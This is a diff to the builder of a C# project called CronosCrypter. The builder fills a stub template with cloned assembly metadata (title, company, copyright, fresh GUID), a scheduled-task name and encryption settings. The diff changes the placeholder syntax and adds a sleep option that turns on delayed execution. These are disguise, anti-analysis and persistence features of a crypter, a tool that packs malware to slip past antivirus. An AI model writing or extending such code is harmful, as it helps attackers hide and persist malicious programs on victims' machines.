@@ -123,14 +123,14 @@ namespace CronosCrypter.Builder
             stub = stub.Replace("[SCHTASKS]", _settings.schtasksName);
 
             // Assembly cloner
-            stub = stub.Replace("#AssemblyTitle", this._settings.assemblyInfo.assemblyTitle);
-            stub = stub.Replace("#AssemblyDescription", this._settings.assemblyInfo.assemblyDescription);
-            stub = stub.Replace("#AssemblyProduct", this._settings.assemblyInfo.assemblyProductName);
-            stub = stub.Replace("#AssemblyCompany", this._settings.assemblyInfo.assemblyCompany);
-            stub = stub.Replace("#AssemblyCopyright", this._settings.assemblyInfo.assemblyCopyright);
-            stub = stub.Replace("#AssemblyTrademark", this._settings.assemblyInfo.assemblyCopyright);
-            stub = stub.Replace("#AssemblyVersion", this._settings.assemblyInfo.assemblyVersion ?? "1.0.0.0");
-            stub = stub.Replace("#Guid", Guid.NewGuid().ToString());
+            stub = stub.Replace("[AssemblyTitle]", this._settings.assemblyInfo.assemblyTitle);
+            stub = stub.Replace("[AssemblyDescription]", this._settings.assemblyInfo.assemblyDescription);
+            stub = stub.Replace("[AssemblyProduct]", this._settings.assemblyInfo.assemblyProductName);
+            stub = stub.Replace("[AssemblyCompany]", this._settings.assemblyInfo.assemblyCompany);
+            stub = stub.Replace("[AssemblyCopyright]", this._settings.assemblyInfo.assemblyCopyright);
+            stub = stub.Replace("[AssemblyTrademark]", this._settings.assemblyInfo.assemblyCopyright);
+            stub = stub.Replace("[AssemblyVersion]", this._settings.assemblyInfo.assemblyVersion ?? "1.0.0.0");
+            stub = stub.Replace("[Guid]", Guid.NewGuid().ToString());
 
             // Encryption type
             EncryptionType encryptionType = _settings.encryptionType;
@@ -154,6 +154,12 @@ namespace CronosCrypter.Builder
                 stub = stub.Replace("//#define REGASM", "#define REGASM");
             }
 
+            // Settings
+            if(_settings.doSleep == true)
+            {
+                stub = stub.Replace("[SLEEP]", _settings.sleep.ToString());
+                stub = stub.Replace("//#define SLEEP", "#define SLEEP");
+            }
 
             return stub;
         }
